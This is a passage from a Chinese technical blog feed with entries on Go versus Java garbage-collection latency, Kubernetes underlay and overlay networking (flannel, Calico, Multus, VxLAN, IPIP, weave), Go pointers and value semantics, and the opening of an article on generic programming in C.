设计中总是存在权衡。他提出的观点是，因为 Go 的目标是低延迟收集，所以它们会受到许多其他指标的影响。这是一本有趣的读物，因为它涵盖了很多关于 GC 设计权衡的细节。</p><p>首先，我所说的低延迟是什么意思？与可能花费数百毫秒的各种 Java 收集器相比，Go GC 平均仅暂停大约 0.5 毫秒。</p><p>我从 Mike Hearn 的论点中看到的问题是，它们基于一个有缺陷的前提，即所有语言的内存访问模式都是相同的。正如我在本文中介绍的那样，这根本不是真的。Go 将产生更少的对象来由 GC 管理，并且它会使用逃逸分析及早清理大量对象。</p><p><strong>旧技术天生就不好？</strong></p><p>赫恩提出的论点表明，简单的收集在某种程度上天生就不好：</p><blockquote><p>Stop-the-world (STW) 标记&#x2F;扫描是本科计算机科学课程中最常教授的 GC 算法。在进行工作面试时，我有时会要求应聘者谈谈 GC，而且几乎总是，他们要么将 GC 视为一个黑匣子，对此一无所知，要么认为它现在仍在使用这种非常古老的技术。</p></blockquote><p>是的，它可能已经过时了，但是这种技术允许您同时运行 GC，这是“现代”技术所不允许的。在我们拥有多核的现代硬件世界中，这一点更为重要。</p><p><strong>Go 不是 C#</strong></p><p>另一种说法：</p><blockquote><p>由于 Go 是一种具有值类型的相对普通的命令式语言，它的内存访问模式可能与 C# 相当，其中分代假设肯定成立，因此 .NET 使用分代收集器。</p></blockquote><p>情况并非如此。AC# 开发人员会尽量减少对较大值对象的使用，因为与指针相关的代码无法安全使用。我们必须假设 C# 开发人员更喜欢复制值类型而不是使用指针，因为这可以在 CLR 中安全地完成。这自然会带来更高的开销。</p><p>据我所知，C# 也没有利用逃逸分析来减少堆上短期对象的产生。其次，<a href="https://alexyakunin.medium.com/go-vs-c-part-1-goroutines-vs-async-await-ac909c651c11">C# 并不擅长同时运行大量任务</a>。正如 Pacer 所提到的，Go 可以利用它们的协程来加速并发收集。</p><h2 id="为什么低延迟对-Java-也很重要"><a href="#为什么低延迟对-Java-也很重要" class="headerlink" title="为什么低延迟对 Java 也很重要"></a>为什么低延迟对 Java 也很重要</h2><p>我们生活在一个充满 docker 容器和微服务的世界中。这意味着许多较小的程序相互通信并为彼此工作。想象一下工作需要通过几个服务。每当一条链中的这些服务中的一项出现重大暂停时，就会产生涟漪效应。它会导致所有其他进程停止工作。如果管道中的下一个服务正在等待一个忙于进行垃圾收集的服务，它就无法工作。</p><p>因此，延迟&#x2F;吞吐量的权衡不再是 GC 设计中的权衡。当多个服务一起工作时，高延迟会导致吞吐量下降。Java 对高吞吐量和高延迟 GC 的偏好适用于单体应用程序世界。它不再适用于微服务世界。</p><p>这是 Mike Hearn 的论点的一个基本问题，即没有灵丹妙药，只有权衡取舍。它试图给人的印象是 Java 的权衡是同样有效的。但权衡必须适合我们生活的世界。</p><p>简而言之，我认为可以说围棋做出了许多明智的举动和战略选择。挥舞它，好像它只是任何人都可以做出的权衡一样，并没有削减它</p>]]></content>
    
    
    <categories>
      
      <category>golang vs java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes网络模型进阶</title>
    <link href="/2022/09/10/Kubernetes%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E8%BF%9B%E9%98%B6/"/>
    <url>/2022/09/10/Kubernetes%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                                                   Kubernetes 网络模型进阶<h2 id="Underlay-Network-Model"><a href="#Underlay-Network-Model" class="headerlink" title="Underlay Network Model"></a>Underlay Network Model</h2><h3 id="什么是Underlay-Network"><a href="#什么是Underlay-Network" class="headerlink" title="什么是Underlay Network"></a>什么是Underlay Network</h3><p>底层网络 <em>Underlay Network</em> 顾名思义是指网络设备基础设施，如交换机，路由器, <em>DWDM</em> 使用网络介质将其链接成的物理网络拓扑，负责网络之间的数据包传输。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyxjoDlKBvyPVoThkJ42pKhe4t3iaE0U1VgCcn0jybn1TCx6yicMB1efjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                  <strong>图：Underlay network topology</strong></p><p><em>Source：</em><a href="https://community.cisco.com/t5/data-center-switches/understanding-underlay-and-overlay-networks/td-p/4295870">https://community.cisco.com/t5/data-center-switches/understanding-underlay-and-overlay-networks/td-p/4295870</a></p><p><em>underlay network</em> 可以是二层，也可以是三层；二层 <em>underlay network</em> 的典型例子是以太网 <em>Ethernet</em>，三层是 <em>underlay network</em> 的典型例子是互联网 <em>Internet</em>。</p><p>而工作与二层的技术是 <em>vlan</em>，工作在三层的技术是由 <em>OSPF</em>, <em>BGP</em> 等协议组成</p><h3 id="kubernetes中的underlay-network"><a href="#kubernetes中的underlay-network" class="headerlink" title="kubernetes中的underlay network"></a>kubernetes中的underlay network</h3><p>在kubernetes中，<em>underlay network</em> 中比较典型的例子是通过将宿主机作为路由器设备，Pod 的网络则通过学习成路由条目从而实现跨节点通讯。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyqjHDK7dv8WtgBpibmbozUC7wo5zWdEDlIkoK03vxpv5QoR7ciaVNKzTw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                  <strong>图：underlay network topology in kubernetes</strong></p><p>这种模型下典型的有 <em>flannel</em> 的 <em>host-gw</em> 模式与 <em>calico</em> <em>BGP</em> 模式。</p><h4 id="flannel-host-gw-1"><a href="#flannel-host-gw-1" class="headerlink" title="flannel host-gw [1]"></a>flannel host-gw [1]</h4><p><em>flannel host-gw</em> 模式中每个Node需要在同一个二层网络中，并将Node作为一个路由器，跨节点通讯将通过路由表方式进行，这样方式下将网络模拟成一个<em>underlay network</em>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyDLPDv7ZTCW14W1wtUs1SbR9yOcibm3ncwCd6dJV7C076XoSovLehaZA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                         <strong>图：layer2 ethernet topology</strong></p><p><em>Source：</em><a href="https://www.auvik.com/franklyit/blog/layer-3-switches-layer-2/">https://www.auvik.com/franklyit/blog/layer-3-switches-layer-2/</a></p><blockquote><p>Notes：因为是通过路由方式，集群的cidr至少要配置16，因为这样可以保证，跨节点的Node作为一层网络，同节点的Pod作为一个网络。如果不是这种用情况，路由表处于相同的网络中，会存在网络不可达</p></blockquote><h4 id="Calico-BGP-2"><a href="#Calico-BGP-2" class="headerlink" title="Calico BGP [2]"></a>Calico BGP [2]</h4><p>BGP（<em>Border Gateway Protocol</em>）是去中心化自治路由协议。它是通过维护IP路由表或’前缀’表来实现AS （<em>Autonomous System</em>）之间的可访问性，属于向量路由协议。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyGwaHm71fY1JAaOyWcdvfX0gjcO0e61aB56kskOgdjsLSmiayBoaLeQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                  <strong>图：BGP network topology</strong></p><p><em>Source：</em><a href="https://infocenter.nokia.com/public/7705SAR214R1A/index.jsp?topic=/com.sar.routing_protocols%25">https://infocenter.nokia.com/public/7705SAR214R1A/index.jsp?topic=%2Fcom.sar.routing_protocols%</a></p><p>与 <em>flannel</em> 不同的是，<em>Calico</em> 提供了的 <em>BGP</em> 网络解决方案，在网络模型上，<em>Calico</em> 与 <em>Flannel host-gw</em> 是近似的，但在软件架构的实现上，<em>flannel</em> 使用 <em>flanneld</em> 进程来维护路由信息；而 <em>Calico</em> 是包含多个守护进程的，其中 <em>Brid</em> 进程是一个 <em>BGP</em> 的客户端 与路由反射器(<em>Router Reflector</em>)，<em>BGP</em> 客户端负责从 <em>Felix</em> 中获取路由并分发到其他 <em>BGP Peer</em>，而反射器在BGP中起了优化的作用。在同一个IBGP中，BGP客户端仅需要和一个 <em>RR</em> 相连，这样减少了<em>AS</em>内部维护的大量的BGP连接。通常情况下，<em>RR</em> 是真实的路由设备，而 <em>Bird</em> 作为 <em>BGP</em> 客户端工作。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyfEXWkGJTBS8TSt3pksPGe18LTicxXWDvCnTZXPibJrJ5Og5oE1wOHibrQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                       <strong>图：Calico Network Architecture</strong></p><p><em>Source：</em><a href="https://www.cisco.com/c/en/us/td/docs/dcn/whitepapers/cisco-nx-os-calico-network-design.html">https://www.cisco.com/c/en/us/td/docs/dcn/whitepapers/cisco-nx-os-calico-network-design.html</a></p><h4 id="IPVLAN-amp-MACVLAN-4"><a href="#IPVLAN-amp-MACVLAN-4" class="headerlink" title="IPVLAN &amp; MACVLAN [4]"></a>IPVLAN &amp; MACVLAN [4]</h4><p><em>IPVLAN</em> 和 <em>MACVLAN</em> 是一种网卡虚拟化技术，两者之间的区别为， <em>IPVLAN</em> 允许一个物理网卡拥有多个IP地址，并且所有的虚拟接口用同一个MAC地址；而 <em>MACVLAN</em> 则是相反的，其允许同一个网卡拥有多个MAC地址，而虚拟出的网卡可以没有IP地址。</p><p>因为是网卡虚拟化技术，而不是网络虚拟化技术，本质上来说属于 <em>Overlay network</em>，这种方式在虚拟化环境中与<em>Overlay network</em> 相比最大的特点就是可以将Pod的网络拉平到Node网络同级，从而提供更高的性能、低延迟的网络接口。本质上来说其网络模型属于下图中第二个。</p><ul><li>虚拟网桥：创建一个虚拟网卡对(veth pair)，一头栽容器内，一头栽宿主机的root namespaces内。这样一来容器内发出的数据包可以通过网桥直接进入宿主机网络栈，而发往容器的数据包也可以经过网桥进入容器。</li><li>多路复用：使用一个中间网络设备，暴露多个虚拟网卡接口，容器网卡都可以介入这个中间设备，并通过MAC&#x2F;IP地址来区分packet应该发往哪个容器设备。</li><li>硬件交换，为每个Pod分配一个虚拟网卡，这样一来，Pod与Pod之间的连接关系就会变得非常清晰，因为近乎物理机之间的通信基础。如今大多数网卡都支持SR-IOV功能，该功能将单一的物理网卡虚拟成多个VF接口，每个VF接口都有单独的虚拟PCIe通道，这些虚拟的PCIe通道共用物理网卡的PCIe通道。</li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyXl7hJSbrKicdnPZLbNhads4BrWPwDS78RZJIAtodUb5v8m0mWtkmiaDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                           <strong>图：Virtual networking modes: bridging, multiplexing and SR-IOV</strong></p><p><em>Source：</em><a href="https://thenewstack.io/hackers-guide-kubernetes-networking/">https://thenewstack.io/hackers-guide-kubernetes-networking/</a></p><p>在kubernetes中 <em>IPVLAN</em> 这种网络模型下典型的CNI有，multus 与 danm。</p><h5 id="multus"><a href="#multus" class="headerlink" title="multus"></a>multus</h5><p><em>multus</em> 是 intel 开源的CNI方案，是由传统的 <em>cni</em> 与 <em>multus</em> 组成，并且提供了 SR-IOV CNI 插件使 K8s pod 能够连接到 SR-IOV VF 。这是使用了 <em>IPVLAN&#x2F;MACVLAN</em> 的功能。</p><p>当创建新的Pod后，SR-IOV 插件开始工作。配置 VF 将被移动到新的 CNI 名称空间。该插件根据 CNI 配置文件中的 “name” 选项设置接口名称。最后将VF状态设置为UP。</p><p>下图是一个 Multus 和 SR-IOV CNI 插件的网络环境，具有三个接口的 pod。</p><ul><li><em>eth0</em> 是 <em>flannel</em> 网络插件，也是作为Pod的默认网络</li><li>VF 是主机的物理端口 <em>ens2f0</em> 的实例化。这是英特尔X710-DA4上的一个端口。在Pod端的 VF 接口名称为 <em>south0</em> 。</li><li>这个VF使用了 DPDK 驱动程序，此 VF 是从主机的物理端口 <em>ens2f1</em> 实例化出的。这个是英特尔® X710-DA4上另外一个端口。Pod 内的 VF 接口名称为 <em>north0</em>。该接口绑定到 DPDK 驱动程序 <em>vfio-pci</em> 。</li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxy1fqm6eakBu9XZT59bervsUvIFp2pF4fteTOULSaV24NIaSTFaTCuYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                      <strong>图：Mutus networking Architecture overlay and SR-IOV</strong></p><p><em>Source：</em><a href="https://builders.intel.com/docs/networkbuilders/enabling_new_features_in_kubernetes_for_NFV.pdf">https://builders.intel.com/docs/networkbuilders/enabling_new_features_in_kubernetes_for_NFV.pdf</a></p><blockquote><p>Notes：terminology</p><ul><li>NIC：network interface card，网卡</li><li>SR-IOV：single root I&#x2F;O virtualization，硬件实现的功能，允许各虚拟机间共享PCIe设备。</li><li>VF：Virtual Function，基于PF，与PF或者其他VF共享一个物理资源。</li><li>PF：PCIe Physical Function，拥有完全控制PCIe资源的能力</li><li>DPDK：Data Plane Development Kit</li></ul></blockquote><p>于此同时，也可以将主机接口直接移动到Pod的网络名称空间，当然这个接口是必须存在，并且不能是与默认网络使用同一个接口。这种情况下，在普通网卡的环境中，就直接将Pod网络与Node网络处于同一个平面内了。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyBpQH5b5UoWxWhM0YKPIVBW25oZLowbR6BuCu8ZGf0zXeiatS7zxudTw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                         <strong>图：Mutus networking Architecture overlay and ipvlan</strong></p><p><em>Source：</em><a href="https://devopstales.github.io/kubernetes/multus/">https://devopstales.github.io/kubernetes/multus/</a></p><h5 id="danm"><a href="#danm" class="headerlink" title="danm"></a>danm</h5><p>DANM是诺基亚开源的CNI项目，目的是将电信级网络引入kubernetes中，与multus相同的是，也提供了SR-IOV&#x2F;DPDK 的硬件技术，并且支持IPVLAN.</p><h2 id="Overlay-Network-Model"><a href="#Overlay-Network-Model" class="headerlink" title="Overlay Network Model"></a>Overlay Network Model</h2><h3 id="什么是Overlay"><a href="#什么是Overlay" class="headerlink" title="什么是Overlay"></a>什么是Overlay</h3><p>叠加网络是使用网络虚拟化技术，在 <em>underlay</em> 网络上构建出的虚拟逻辑网络，而无需对物理网络架构进行更改。本质上来说，<em>overlay network</em> 使用的是一种或多种隧道协议 (<em>tunneling</em>)，通过将数据包封装，实现一个网络到另一个网络中的传输，具体来说隧道协议关注的是数据包（帧）。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyyGkhSJE7WhbUna4s0mvzghkvGDCgPsPNtmibTUAtIWYfCRLdkGSasGQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>图：overlay network topology</p><p><em>Source：</em><a href="https://www.researchgate.net/figure/Example-Overlay-Network-built-on-top-of-an-Internet-style-Underlay_fig4_230774628">https://www.researchgate.net/figure/Example-Overlay-Network-built-on-top-of-an-Internet-style-Underlay_fig4_230774628</a></p><h3 id="常见的网络隧道技术"><a href="#常见的网络隧道技术" class="headerlink" title="常见的网络隧道技术"></a>常见的网络隧道技术</h3><ul><li>通用路由封装 ( <em>Generic Routing Encapsulation</em> ) 用于将来自 IPv4&#x2F;IPv6的数据包封装为另一个协议的数据包中，通常工作与L3网络层中。</li><li>VxLAN (<em>Virtual Extensible LAN</em>)，是一个简单的隧道协议，本质上是将L2的以太网帧封装为L4中UDP数据包的方法，使用 4789 作为默认端口。<em>VxLAN</em> 也是 <em>VLAN</em> 的扩展对于 4096（212 位 <em>VLAN ID</em>） 扩展为1600万（224 位 <em>VNID</em> ）个逻辑网络。</li></ul><p>这种工作在 <em>overlay</em> 模型下典型的有 <em>flannel</em> 与 <em>calico</em> 中的的 <em>VxLAN</em>, <em>IPIP</em> 模式。</p><h3 id="IPIP"><a href="#IPIP" class="headerlink" title="IPIP"></a>IPIP</h3><p><em>IP in IP</em> 也是一种隧道协议，与 <em>VxLAN</em> 类似的是，<em>IPIP</em> 的实现也是通过Linux内核功能进行的封装。<em>IPIP</em> 需要内核模块 <code>ipip.ko</code> 使用命令查看内核是否加载IPIP模块<code>lsmod | grep ipip</code> ；使用命令<code>modprobe ipip</code> 加载。</p><p><img src="https://cdn.jsdelivr.net/gh/longpi1/blog-img/640" alt="图片"></p><p>图：A simple IPIP network workflow</p><p><em>Source：</em><a href="https://ssup2.github.io/theory_analysis/IPIP_GRE_Tunneling/">https://ssup2.github.io/theory_analysis/IPIP_GRE_Tunneling/</a></p><p>Kubernetes中 <em>IPIP</em> 与 <em>VxLAN</em> 类似，也是通过网络隧道技术实现的。与 <em>VxLAN</em> 差别就是，<em>VxLAN</em> 本质上是一个 UDP包，而 <em>IPIP</em> 则是将包封装在本身的报文包上。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxybmxBiantAKWVD2nlCUNBHAIQkHSOJZcQeM4znchxeRqicRNvh3pcPIMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                         <strong>图：IPIP in kubernetes</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyNfkHJrC9xJw6SzZRFND1XdRacXJ6A7utD0RYvRyj7qOwJPzM60YiaeA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                         <strong>图：IPIP packet with wireshark unpack</strong></p><blockquote><p>Notes：公有云可能不允许IPIP流量，例如Azure</p></blockquote><h3 id="VxLAN"><a href="#VxLAN" class="headerlink" title="VxLAN"></a>VxLAN</h3><p>kubernetes中不管是 <em>flannel</em> 还是 <em>calico</em> VxLAN的实现都是使用Linux内核功能进行的封装，Linux 对 vxlan 协议的支持时间并不久，2012 年 Stephen Hemminger 才把相关的工作合并到 kernel 中，并最终出现在 kernel 3.7.0 版本。为了稳定性和很多的功能，你可以会看到某些软件推荐在 3.9.0 或者 3.10.0 以后版本的 kernel 上使用 <em>VxLAN</em>。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyVuvdFPpJgI1QG5U2MHUib3DbBGia1HVB6sicRiadIptJxM0B7nUXaCSqYQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                             <strong>图：A simple VxLAN network topology</strong></p><p>在kubernetes中vxlan网络，例如 <em>flannel</em>，守护进程会根据kubernetes的Node而维护 <em>VxLAN</em>，名称为 <code>flannel.1</code> 这是 <em>VNID</em>，并维护这个网络的路由，当发生跨节点的流量时，本地会维护对端 <em>VxLAN</em> 设备的MAC地址，通过这个地址可以知道发送的目的端，这样就可以封包发送到对端，收到包的对端 VxLAN设备 <code>flannel.1</code> 解包后得到真实的目的地址。</p><p>查看 <em>Forwarding database</em> 列表</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$ </span>bridge fdb <span class="hljs-number">26</span><span class="hljs-symbol">:</span>5<span class="hljs-symbol">e:</span><span class="hljs-number">87</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span><span class="hljs-symbol">:</span><span class="hljs-number">91</span><span class="hljs-symbol">:fc</span> dev flannel.<span class="hljs-number">1</span> dst <span class="hljs-number">10.0</span>.<span class="hljs-number">0.3</span> <span class="hljs-variable language_">self</span> permanent<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyib50Tia4cxibibR5uhmL4eO4m158hQFxZsiaWaqYE9vH2Fflee6aEaEACJg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                      <strong>图：VxLAN in kubernetes</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxyCSReVTSz26R2z2ibGa2HvNuTjwKI8tQHHv14amJr1eoOTw05gpMc5mg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                       <strong>图：VxLAN packet with wireshark unpack</strong></p><blockquote><p>Notes：VxLAN使用的4789端口，wireshark应该是根据端口进行分析协议的，而flannel在linux中默认端口是8472，此时抓包仅能看到是一个UDP包。</p></blockquote><p>通过上述的架构可以看出，隧道实际上是一个抽象的概念，并不是建立的真实的两端的隧道，而是通过将数据包封装成另一个数据包，通过物理设备传输后，经由相同的设备（网络隧道）进行解包实现网络的叠加。</p><h3 id="weave-vxlan-3"><a href="#weave-vxlan-3" class="headerlink" title="weave vxlan [3]"></a>weave vxlan [3]</h3><p>weave也是使用了 <em>VxLAN</em> 技术完成的包的封装，这个技术在 <em>weave</em> 中称之为 *fastdp (fast data path)*，与 <em>calico</em> 和 <em>flannel</em> 中用到的技术不同的，这里使用的是 Linux 内核中的 <em>openvswitch datapath module</em>，并且weave对网络流量进行了加密。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/D727NicjCjMOfSoHgRPZfL1ZzWoqxIyxy1r4xqNRVbh6Ua8kaalhWPbicCYYI0CcbC3tLeuoMGHxLX6zLqmEOiawA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                           <strong>图：weave fastdp network topology</strong></p><p><em>Source：</em><a href="https://www.weave.works/docs/net/latest/concepts/fastdp-how-it-works/">https://www.weave.works/docs/net/latest/concepts/fastdp-how-it-works/</a></p><blockquote><p>Notes：fastdp工作在Linux 内核版本 3.12 及更高版本，如果低于此版本的例如CentOS7，weave将工作在用户空间，weave中称之为 <em>sleeve mode</em></p></blockquote><p>Reference</p><p>[1] flannel host-gw</p><p>[2] calico bgp networking</p><p>[3] calico bgp networking</p><p>[4] sriov network</p><p>[5] danm</p><p>作者：Cylon</p><p>出处：<a href="https://www.cnblogs.com/Cylon/p/16595820.html">https://www.cnblogs.com/Cylon/p/16595820.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kubernetes</tag>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang对比Java、python为什么要保留指针</title>
    <link href="/2022/09/05/Golang%E5%AF%B9%E6%AF%94Java%E3%80%81python%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BF%9D%E7%95%99%E6%8C%87%E9%92%88/"/>
    <url>/2022/09/05/Golang%E5%AF%B9%E6%AF%94Java%E3%80%81python%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BF%9D%E7%95%99%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Golang对比Java、python为什么要保留指针<h2 id="为什么要用指针？"><a href="#为什么要用指针？" class="headerlink" title="为什么要用指针？"></a>为什么要用指针？</h2><p>平时我们在Golang使用指针一般是为了以下的情况：</p><ul><li><strong>方法直接修改原来对象</strong></li><li><strong>保证参数传递的自由，可以在传递重量级对象时使用指针</strong></li></ul><p>但Go 保留指针不仅仅是为了解决传递参数的问题，还跟它的语言特性有密不可分的联系。</p><h2 id="值语义"><a href="#值语义" class="headerlink" title="值语义"></a>值语义</h2><p>Go 里面的变量是<strong>值语义</strong>，这个跟 C&#x2F;C++是一脉相承的。比如一个结构体变量赋值给另外一个变量就是一次内存拷贝，而不是只拷贝一个指针，因此需要指针来表达引用语义，关于拷贝的具体实现可以了解<a href="https://gfw.go101.org/article/value-part.html">直接值部与间接值部的实现</a>。</p><p>关于值语义(value semantics)：<strong>值语义</strong>指的是对象的拷贝与原对象无关，就像拷贝 int 一样。C++ 的内置类型(bool&#x2F;int&#x2F;double&#x2F;char)都是值语义，标准库里的 complex&lt;&gt; 、pair&lt;&gt;、vector&lt;&gt;、map&lt;&gt;、string 等等类型也都是值语意，拷贝之后就与原对象脱离关系。同样，Java 语言的 primitive types 也是值语义。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p><strong>复杂的高级类型占用的内存往往相对较大，存储在 <a href="https://www.zhihu.com/search?q=heap&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1665421830%7D">heap</a> 中，GC 回收频率相对较低，代价也较大，因此传引用&#x2F;指针可以避免进行成本较高的复制操作，并且节省内存，提高程序运行效率。</strong></p><p>为什么要保留值语义，而不是像 Java 或者 Python 一样让复合类型默认都是指针类型呢？因为值语义带来了如下好处：</p><ul><li><strong><a href="https://www.zhihu.com/search?q=%E7%BB%93%E6%9E%84%E4%BD%93&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2242103027%7D">结构体</a>可以直接用来比较相等，而非比较指针，Java 里面的 &#x3D;&#x3D; 操作符除了基本类型有用，其他类型几乎没用。</strong></li><li><strong>与 C 语言更好地交互。Go 可以通过 cgo 与 C 语言无缝交互。Go 里面的结构体基本上不用特殊处理就能传递给 C 的函数使用。主要得益于 Go 的结构体和 C 的一样都是值类型。</strong></li><li><strong>开发者能更好的掌控内存布局。一个结构体数组就是一段连续内存，而不是一个指针数组。</strong></li><li><strong>减轻 GC 压力。紧凑的内存布局减少了 GC 对象的个数，比如一个100w 长度的结构体数组就是一个 GC 对象，而不是100w 个。</strong></li><li><strong>减轻堆内存的分配压力。函数通过传值的方式传递参数后，原变量不会发生逃逸，可以被分配在栈上</strong></li></ul><p>Go 为了内存安全，虽然有指针，但不支持指针算数，但结合 unsafe.Pointer 也可以完成一些非常规情景下的精细内存操作。比如结合 <a href="https://www.zhihu.com/search?q=mmap&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2242103027%7D">mmap</a> 实现堆外内存管理，runtime 里面的内存管理就是这么来的，完全不用另外用 C 语言来实现。 这也是可以使用 Go 语言来写操作系统（<a href="https://link.zhihu.com/?target=https://github.com/icexin/eggos">eggos</a>）的原因。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><strong>Go 的指针一方面提供了引用语义，另一方面像 C 语言一样给了开发者灵活管理内存的能力。</strong></p><p>参考链接：樊冰心：<a href="https://www.zhihu.com/question/399589293/answer/2242103027">https://www.zhihu.com/question/399589293/answer/2242103027</a></p>]]></content>
    
    
    <categories>
      
      <category>golang vs java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编程范式之泛型编程</title>
    <link href="/2022/09/04/%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8F%E4%B9%8B%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/09/04/%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8F%E4%B9%8B%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#  编程范式之泛型编程<h3 id="C-语言的泛型"><a href="#C-语言的泛型" class="headerlink" title="C 语言的泛型"></a>C 语言的泛型</h3><h3 id="一个泛型的示例-swap-函数"><a href="#一个泛型的示例-swap-函数" class="headerlink" title="一个泛型的示例 - swap 函数"></a>一个泛型的示例 - swap 函数</h3><p>好了，我们再看下，C 语言是如何泛型的。C 语言的类型泛型基本上来说就是使用<code>void *</code>关键字或是使用宏定义。</p><p>下面是一个使用了<code>void*</code>泛型版本的 swap 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">void</span>* x, <span class="hljs-type">void</span>* y, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>     <span class="hljs-type">char</span> tmp[size];<br>     <span class="hljs-built_in">memcpy</span>(tmp, y, size);<br>     <span class="hljs-built_in">memcpy</span>(y, x, size);<br>     <span class="hljs-built_in">memcpy</span>(x, tmp, size);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面这个函数几乎完全改变了 int 版的函数的实现方式，这个实现方式有三个重点：</p><ul><li><strong>函数接口中增加了一个<code>size</code>参数</strong>。为什么要这么干呢？因为，用了 <code>void*</code> 后，类型被“抽象”掉了，编译器不能通过类型得到类型的尺寸了，所以，需要我们手动地加上一个类型长度的标识。</li><li><strong>函数的实现中使用了<code>memcpy()</code>函数</strong>。为什么要这样干呢？还是因为类型被“抽象”掉了，所以不能用赋值表达式了，很有可能传进来的参数类型还是一个结构体，因此，为了要交换这些复杂类型的值，我们只能使用内存复制的方法了。</li><li><strong>函数的实现中使用了一个<code>temp[size]</code>数组</strong>。这就是交换数据时需要用的 buffer，用 buffer 